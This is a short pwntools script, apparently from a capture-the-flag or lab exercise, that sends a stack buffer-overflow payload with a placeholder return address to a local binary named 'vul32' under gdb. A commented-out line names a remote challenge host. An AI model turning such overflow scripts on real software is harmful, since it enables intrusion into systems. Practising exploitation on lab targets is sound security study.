##!/usr/bin/env python
from pwn import *

# sh = remote("cssc.vul337.team", 49241)
sh = process('./vul32')
pwnlib.gdb.attach(proc.pidof(sh)[0])

print("test return address overflow")
test_addr = 0x00000000
payload = flat(['a' * 0x33, 'G', test_addr])
sh.sendline(payload)

sh.interactive()